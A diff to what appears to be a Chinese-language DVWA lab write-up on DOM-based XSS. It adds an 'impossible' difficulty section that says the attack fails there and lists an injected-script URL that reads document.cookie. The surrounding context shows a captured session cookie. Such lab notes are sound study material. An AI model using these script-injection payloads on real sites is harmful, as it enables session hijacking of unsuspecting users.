@@ -75,3 +75,11 @@ http://dvwa.localtest/vulnerabilities/xss_d/?default=English%3Cscript%3Ealert(do
 ```
 PHPSESSID=ov64qqshkod7693old2kdk59e3; security=high
 ```
+
+### impossible
+
+在 impossible 難度下測試無效 😮‍💨
+
+```jsx
+http://dvwa.localtest/vulnerabilities/xss_d/?default=English%3Cscript%3Ealert(document.cookie)%3C/script%3E&default=English
+```
